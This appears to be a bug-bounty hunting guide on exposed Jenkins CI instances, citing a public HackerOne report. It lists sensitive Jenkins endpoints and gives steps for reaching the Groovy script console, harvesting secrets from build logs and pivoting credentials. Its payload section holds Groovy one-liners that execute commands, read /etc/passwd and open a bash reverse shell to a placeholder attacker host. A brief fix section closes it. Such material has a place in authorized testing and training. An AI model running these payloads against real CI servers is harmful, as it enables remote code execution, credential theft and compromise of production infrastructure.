---
name: exposed-jenkins
description: Open Jenkins/CI instance → RCE via script console, credential stores, and build jobs. Teaches CI/CD reconnaissance and the fastest paths to code execution on build infrastructure.
sources: hackerone_public
report_count: 1
---

# Exposed Jenkins (CI) → RCE

**Report**: Snapchat — "Open prod Jenkins instance" (hackerone.com/reports/231460, high, $15,000, Information Disclosure). See also Superhuman GitHub token in Travis logs (#496937).

## Why it matters (the new lesson)
CI systems (Jenkins, GitLab CI, GitHub Actions, Drone, TeamCity) hold the keys to production: source, secrets, deploy creds. An open Jenkins means the Script Console (`/script`) = instant RCE, plus stored credentials and secrets in build logs. CI is the crown jewel of internal recon.

## How it works
```
/script          # Groovy console -> RCE
/credentials/    # stored creds
/configureSecurity  # reconfig
job/*/consoleText  # build logs may leak env/secrets
```
Groovy RCE: `println "id".execute().text` or `new File("/etc/passwd").text`.

## How to hunt for it
1. Fingerprint Jenkins (`X-Jenkins` header, `/login`, `/script`); enumerate `/job`, `/view`, `/credentials`.
2. If anonymous can run builds or reach `/script` → RCE.
3. Read build logs for leaked env/secrets; pivot creds to SCM/production.

## Payloads
```groovy
// Script Console
def cmd = "id"; println cmd.execute().text
new File("/etc/passwd").getText()
// reverse shell (linux)
"bash -c 'bash -i >& /dev/tcp/ATTACKER/28006 0>&1'".execute()
```

## Fix
Require SSO + role-based auth on Jenkins; disable anonymous; restrict Script Console; mask/redact secrets in logs; firewall CI to VPN.
